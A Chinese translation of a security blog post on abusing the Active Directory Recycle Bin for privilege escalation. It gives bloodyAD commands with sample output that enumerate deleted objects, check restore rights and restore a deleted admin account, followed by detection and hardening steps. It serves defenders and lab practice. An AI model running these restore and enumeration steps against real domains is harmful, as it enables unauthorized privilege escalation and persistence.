> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxODM5ODQzNQ==&mid=2247488924&idx=1&sn=fd5c369c50dfb523c63dab43e94fba98

#  你检查过回收站了吗？挖掘 Active Directory 回收站中的权限提升漏洞  
Baptiste Crépin  securitainment   2025-06-26 12:59  
  
> Have You Looked in the Trash? Unearthing Privilege Escalations from the Active Directory Recycle Bin   
  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/hoiaQy7WhTCOOEtgNkmr4Ozg9bW216C39L4ZVPJNCqR2903qw6cpXb7ZxsLicO0uDmBCibq283uER5tIL3XDzMAzw/640?wx_fmt=other&from=appmsg "")  
  
"你检查过回收站吗？"  
  
这是我们许多人成长过程中常听到的一句话——通常是在我们找不到就在眼前的东西时。在网络安全领域，这个建议比以往任何时候都更加真实，尤其是在 Active Directory（AD）方面。  
  
Active Directory 回收站通常被视为安全网——被删除对象在永久移除前的休息场所。但对于攻击者来说，这可能是一个机会宝库。被删除的用户、组和其他对象可能仍保留着关键属性，这些属性可以被利用来进行权限提升、横向移动或持久化。  
  
在本文中，我们将深入探讨 AD 回收站的工作原理，攻击者如何利用它来获得提升的访问权限，以及防御者如何在这些风险成为真正威胁之前检测和缓解它们。  
## 理解 Active Directory 回收站  
  
Active Directory 回收站在 Windows Server 2008 R2 中引入，以使对象恢复更容易和安全。此功能必须显式启用，一旦激活就不可逆转。当对象（如用户或组）被删除时，它不会立即清除——它被标记为"已删除"并移动到一个隐藏容器中。这保留了所有属性，如组成员身份、权限和 SID 历史记录，允许在需要时一键恢复。  
  
已删除对象的默认保留时间为 180 天，由_Directory Service_对象（
```
CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=example,DC=com
```

  
）中的tombstoneLifetime属性定义，除非被 msDS-DeletedObjectLifetime  
 覆盖。如果两个属性都未定义，则保留时间为 60 天（Windows 2000–2008 Server）或仅 2 天（2008 R2 及更高版本）。 一旦保留期到期，_已删除对象_将被回收，其_isRecycled_属性设置为
```
TRUE
```

  
。在此状态下，对象不再包含所有属性数据，只能通过与 AD 快照直接交互的工具恢复。此状态向其他 DC 在复制期间发出信号，表明该对象已消失。  
  
![对象生命周期图](https://mmbiz.qpic.cn/mmbiz_jpg/hoiaQy7WhTCOOEtgNkmr4Ozg9bW216C39G8EzJ59X2bkOnEMy7Xrw0hEGAev6YdD7ve7EjDq02cvzldLpq8IQGQ/640?wx_fmt=other&from=appmsg "")  
  
对象生命周期图  
  
来自 Microsoft 的对象生命周期图  
  
如果未启用回收站或服务器版本早于 2008 R2，对象将被_墓碑化_而不是被_删除_。墓碑化对象看起来与回收对象相似，但可以恢复。然而，它们被剥离了大多数属性，仅保留其_ObjectSID_、nTSecurityDescriptor  
（因此直接链接到它们的 ACL 保持完整），以及自 Windows 2003 以来的sIDHistory  
，但会失去所有组成员身份。  
  
然而，这种便利性带来了一个隐藏的成本：安全盲点。许多组织认为已删除对象是无害的，但如果管理不当，它们仍然可以被查询、恢复甚至滥用。  
  
**关键点：**  
- 已删除对象保留所有属性（包括敏感属性）  
  
- 墓碑化对象保留最重要的属性  
  
- 它们存储在
```
CN=Deleted Objects
```

  
容器中  
  
- 如果未被回收或永久删除，它们可以恢复所有权限  
  
## 权限提升攻击向量  
  
获得 AD 读取权限的攻击者可以枚举已删除对象并寻找提升权限的机会。示例包括：  
- **SID 历史记录滥用：**  
 已删除/墓碑化对象可能保留授予特权对象权限的 SID 历史记录。  
  
- **组成员身份：**  
 恢复已删除对象可以重新启用对敏感资源的访问，因为它会重新获得所有成员身份。  
  
- **ACL 和委派：**  
 已删除/墓碑化对象可能仍被 ACL 引用或具有 Kerberos 委派，允许间接访问或控制。  
  
- **敏感信息：**  
 已删除对象可能包含敏感信息，如
```
description
```

  
、
```
info
```

  
或自定义字段中的明文密码。  
  
还有许多其他滥用可能性（GPO、OU 等），这些向量在传统审计中经常被遗漏，使回收站成为一个隐蔽的攻击面。  
## 先决条件  
  
要列出已删除对象，主体必须对_已删除对象_容器具有
```
LIST_CHILD
```

  
权限，并使用特殊的 LDAP 控制 OID
```
1.2.840.113556.1.4.2064
```

  
（显示已删除、墓碑化和回收的对象）：  

```


# List deleted objects with bloodyAD
$ bloodyAD -u Administrator -d bloody -p 'Password123!' --host 192.168.100.3 get search -c 1.2.840.113556.1.4.2064 --resolve-sd --attr ntsecuritydescriptor --base 'CN=Deleted Objects,DC=bloody,DC=corp' --filter &#34;(objectClass=container)&#34;


distinguishedName: CN=Deleted Objects,DC=bloody,DC=corp
[...]
nTSecurityDescriptor.ACL.0.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.0.Trustee: john
nTSecurityDescriptor.ACL.0.Right: LIST_CHILD
nTSecurityDescriptor.ACL.0.ObjectType: Self
[...]


$ bloodyAD -u john -d bloody -p 'Password123!' --host 192.168.100.3 get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)' --attr name


distinguishedName: CN=test_pc\0ADEL:db0e6105-73a0-44e6-b9ad-a546af714ae5,CN=Deleted Objects,DC=bloody,DC=corp
name: test_pc
DEL:db0e6105-73a0-44e6-b9ad-a546af714ae5


distinguishedName: CN=test_pc2\0ADEL:c535b0ea-c822-4920-9452-292824d1f091,CN=Deleted Objects,DC=bloody,DC=corp
name: test_pc2
DEL:c535b0ea-c822-4920-9452-292824d1f091


distinguishedName: CN=test_pc3\0ADEL:c9e8a129-f77f-4159-b700-3c8fd06963fe,CN=Deleted Objects,DC=bloody,DC=corp
name: test_pc3
DEL:c9e8a129-f77f-4159-b700-3c8fd06963fe
[...]
```

  
要恢复对象，主体应具备以下权限：  
- 对域对象具有**恢复墓碑对象**  
(Restore Tombstoned) 权限  
  
- 对已删除对象具有**通用写入**  
(Generic Write) 权限  
  
- 对用于恢复的组织单位 (OU) 具有**创建子对象**  
(Create Child) 权限 （提示：可以使用 bloodyAD 的
```
--newParent
```

  
参数指定您具有此权限的 OU）  
  

```


# Check restore rights
$ bloodyAD --host 192.168.100.3 -d bloody -u john -p 'Password123!' get object 'DC=bloody,DC=corp' --attr ntsecuritydescriptor --resolve-sd


distinguishedName: DC=bloody,DC=corp
[...]
nTSecurityDescriptor.ACL.4.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.4.Trustee: john
nTSecurityDescriptor.ACL.4.Right: CONTROL_ACCESS
nTSecurityDescriptor.ACL.4.ObjectType: Reanimate-Tombstones
[..]


$ bloodyAD -u john -d bloody -p 'Password123!' --host 192.168.100.3 get search -c 1.2.840.113556.1.4.2064 --filter '(&(isDeleted=TRUE)(sAMAccountName=test_pc3$))' --attr ntsecuritydescriptor --resolve-sd


distinguishedName: CN=test_pc3\0ADEL:c9e8a129-f77f-4159-b700-3c8fd06963fe,CN=Deleted Objects,DC=bloody,DC=corp
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_PRESENT|SELF_RELATIVE
[...]
nTSecurityDescriptor.ACL.28.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.28.Trustee: john
nTSecurityDescriptor.ACL.28.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.28.ObjectType: Self
nTSecurityDescriptor.ACL.28.Flags: CONTAINER_INHERIT; INHERITED
[...]


$ bloodyAD --host 192.168.100.3 -d bloody -u john -p 'Password123!' get object 'CN=Users,DC=bloody,DC=corp' --attr ntsecuritydescriptor --resolve-sd


distinguishedName: CN=Users,DC=bloody,DC=corp
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
[...]
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: john
nTSecurityDescriptor.ACL.3.Right: CREATE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: Self
nTSecurityDescriptor.ACL.3.Flags: CONTAINER_INHERIT
[...]
```

  
默认情况下，只有域管理员 (Domain Admins) 能够列出和恢复已删除的对象。  
  
尽管文档表明 SharpHound 可以检索已删除对象，但即使以域管理员身份运行，它也无法实现这一功能（参见BloodHound 文档）。 因此，BloodHound CE 无法检测来自已删除对象的权限提升机会。  
## 实际攻击场景  
  
当攻击者确保他们对已删除对象和组织单位 (OU) 拥有足够的权限，并且具备**恢复墓碑对象**  
(Restore Tombstoned) 权限时：  

```


$ bloodyAD --host 192.168.100.3 -d bloody -u john -p 'Password123!' get writable --include-del
[...]
distinguishedName: CN=garbage.admin\0ADEL:c9e8a129-f77f-4159-b700-3c8fd06963fe,CN=Deleted Objects,DC=bloody,DC=corp
permission: WRITE
[...]
DistinguishedName: CN=Users,DC=bloody,DC=corp
permission: CREATE_CHILD
```

  
攻击者可以轻松地使用 sAMAccountName（安全账户管理器账户名）或 objectSID（对象安全标识符）来恢复该对象：  

```
$ bloodyAD -u john -d bloody -p 'Password123!' --host 192.168.100.3 set restore 'S-1-5-21-1394970401-3214794726-2504819329-1104'


[+] S-1-5-21-1394970401-3214794726-2504819329-1104 has been restored successfully under CN=garbage.admin,CN=Users,DC=bloody,DC=corp
```

  
**示例场景：**  
- **场景 1: 恢复已删除的管理员用户**  
拥有恢复权限的攻击者可以恢复已删除的域管理员账户。由于该账户保留了其 SID(安全标识符) 和组成员身份，它会立即重新获得提升的访问权限。  
  
- **场景 2: SID 历史注入**  
恢复具有特权 SID 历史的已删除用户对象，并利用它绕过组成员身份检查。  
  
- **场景 3: ACL(访问控制列表) 利用**  
已删除的组仍然在关键资源的 ACL 中被引用。攻击者恢复该组并将自己加入其中，从而获得访问权限。  
  
对于想要练习的用户，有一个名为TombWatcher的 HTB(Hack The Box) 机器。  
## 检测与防御  
  
为了防御这些威胁，安全团队可以：  
- **监控恢复操作**  
跟踪谁在何时恢复了对象。这可以通过事件日志和 SIEM(安全信息和事件管理) 集成来实现。 以下是使用事件日志中的_A directory service object was undeleted_事件 5138 的方法：  
  
- 无论是否启用回收站，都要确保启用
```
Directory Service Changes
```

  
(目录服务更改) 审计：  

```
AuditPol /set /subcategory:&#34;Directory Service Changes&#34; /success:enable /failure:enable
```

  
  
-   
-   
- 或者通过组策略 (Group Policy) 进行配置：
```
计算机配置 > 策略 > Windows设置 > 安全设置 > 高级审核策略配置 > 审核策略 > DS访问 > 启用审核目录服务更改
```

  
  
- 容器（例如 CN=Users）或域对象必须具有审核创建操作的系统访问控制列表 (SACL)。使用启用高级功能的 Active Directory 用户和计算机 (ADUC)。右键点击
```
容器 → 属性 → 安全 → 高级 → 审核
```

  
，并通过勾选
```
创建所有子对象
```

  
来添加审核创建操作的条目（不要忘记为域对象启用继承）  
  
然后检查事件查看器 > Windows 日志 > 安全 > 事件 5138:  
  
![事件 5138](https://mmbiz.qpic.cn/mmbiz_jpg/hoiaQy7WhTCOOEtgNkmr4Ozg9bW216C39UXvrPUHCxXbSF1xAV4nx3DZoLcFz7m3KGXNfnHzBnZREO7wAed15hQ/640?wx_fmt=other&from=appmsg "")  
  
事件 5138  
  
- **清理敏感属性**  
在删除前，移除对象的特权组成员身份和 SID 历史记录 (SID History)。  
  
- **调整保留时间**  
默认情况下，每个状态的保留时间为 180 天，可以根据公司策略通过修改以下两个属性之一来减少：  

```
$ bloodyAD -u Administrator -d bloody -p 'Password123!' --host 192.168.100.3 set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=bloody,DC=corp' tombstoneLifetime -v 60
[+] CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=bloody,DC=corp's tombstoneLifetime has been updated


$ bloodyAD -u Administrator -d bloody -p 'Password123!' --host 192.168.100.3 set object 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=bloody,DC=corp' msDS-DeletedObjectLifetime -v 30
[+] CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=bloody,DC=corp's msDS-DeletedObjectLifetime has been updated
```

  
  
-   
-   
-   
-   
-   
- **强制进入回收状态 (Force Recycled State)**  
对于敏感对象，可以通过二次删除强制其进入回收状态 (Recycled State)：  

```
Get-ADObject -Filter {isDeleted -eq $True -and samaccountname -eq &#34;recycletest&#34;} -IncludeDeletedObjects | Remove-ADObject
```

  
  
-   
-   
此功能仅在启用回收站 (Recycle Bin) 时可用。  
- **限制恢复权限**  
仅应授予受信任的管理员 (Trusted Admins) 恢复对象的权限。  
  
## 结论  
  
AD 回收站 (AD Recycle Bin) 不仅仅是一个便利功能——它是一个潜在的攻击面。通过“检查回收站”，攻击者可以发现防御者经常忽视的权限提升路径。通过适当的审计 (Auditing)、监控 (Monitoring) 和策略执行 (Policy Enforcement)，组织可以将这种隐藏风险转化为可控风险。  
  
